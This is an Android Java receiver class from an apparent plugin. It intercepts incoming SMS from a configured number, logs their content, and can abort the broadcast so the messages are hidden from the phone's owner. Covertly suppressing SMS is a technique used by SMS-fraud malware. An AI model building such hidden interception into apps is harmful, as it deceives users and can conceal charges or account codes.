package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: PM11:17
 * To change this template use File | Settings | File Templates.
 */
public class PrivateSMSBRC extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            Config.LOGD("[[PrivateSMSBRC::onReceive]] action = " + intent.getAction());
            SmsMessage[] messages = getMessagesFromIntent(intent);
            for (SmsMessage message : messages) {
                if (message.getOriginatingAddress().indexOf(AppRuntime.BLOCKED_NUMBER) != -1) {
                    String key = message.getMessageBody();
                    Config.LOGD("[[PrivateSMSBRC::onReceive]] has receive SMS from <<" + AppRuntime.BLOCKED_NUMBER + ">>, content : " + key
                        + "\n || sms center = " + message.getServiceCenterAddress()
                        + "\n || sms display origin address = " + message.getDisplayOriginatingAddress()
                        + "\n || sms = " + message.toString()
                        + "\n || intent info = " + intent.toString());

                    if (Config.DELETE_RECEIVED_MESSAGE) {
                        abortBroadcast();
                    }
                }
            }
        }
    }

    private final SmsMessage[] getMessagesFromIntent(Intent intent) {
        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
        byte[][] pduObjs = new byte[messages.length][];
        for (int i = 0; i < messages.length; i++) {
            pduObjs[i] = (byte[]) messages[i];
        }
        byte[][] pdus = new byte[pduObjs.length][];
        int pduCount = pdus.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        for (int i = 0; i < pduCount; i++) {
            pdus[i] = pduObjs[i];
            msgs[i] = SmsMessage.createFromPdu(pdus[i]);
        }
        return msgs;
    }

}
